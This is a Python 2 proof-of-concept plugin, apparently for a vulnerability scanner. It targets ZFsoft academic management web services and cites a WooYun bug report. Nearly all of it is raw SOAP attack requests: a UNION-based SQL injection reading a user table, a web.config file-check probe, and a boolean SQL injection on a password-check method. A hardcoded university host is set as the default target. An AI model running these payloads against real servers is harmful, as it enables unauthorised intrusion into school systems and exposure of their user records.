#/usr/bin/python
#-*- coding: utf-8 -*-
#__Author__ = Mr.lin
#refer:http://www.wooyun.org/bugs/wooyun-2010-0122523
import urlparse,httplib
def assign(service, arg):
    if service == 'zhengfang':
        return True,arg

def SendRtx(target):
    arr=urlparse.urlparse(target)
    raw1='''POST /service.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://www.zf_webservice.com/GetStuCheckinInfo "

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,'testvul',Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01</xh>
      <xnxq xsi:type="xsd:string">2013-2014-1</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
    raw2='''POST /file.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://zfsoft/zfjw/file/checkFile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <checkFile xmlns="http://zfsoft/zfjw/file">
      <fileDir>./web.config</fileDir>
    </checkFile>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
    raw3='''POST /service.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: 795
SOAPAction: "http://www.zf_webservice.com/BMCheckPassword"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:BMCheckPassword xmlns:q1="http://www.zf_webservice.com/BMCheckPassword">
      <strYHM xsi:type="xsd:string">jwc01'and 'a'='a</strYHM>
      <strPassword xsi:type="xsd:string">string</strPassword>
      <xh xsi:type="xsd:string">string</xh>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:BMCheckPassword>
  </soap:Body>
</soap:Envelope>''' % arr.netloc
    url1=target+'service.asmx'
    url2=target+'file.asmx'
    url3=target+'service.asmx'
    code1, head1,res1, errcode1, _ = curl.curl2(url1,raw=raw1)
    code2, head2,res2, errcode2, _ = curl.curl2(url2,raw=raw2)
    code3, head3,res3, errcode3, _ = curl.curl2(url3,raw=raw3)
    if code1==200 and 'testvul' in res1:
        security_hole("GetStuCheckinInfo injection  %s" % target)
    if code2==200 and '<checkFileResult>true</checkFileResult>' in res2:
        security_hole("checkFile injection  %s" % target)
    if code3==200 and "type=\"xsd:int\">5</BMCheckPasswordResult><xh xsi:type=\"xsd:string\">jwc01</xh>" in res3:
        security_hole('BMCheckPassword inject %s' % target) 
def audit(arg):
    SendRtx(arg)
if __name__ == '__main__':
  from dummy import *
  audit(assign('zhengfang','http://zfsoft.jlmpc.cn/')[1])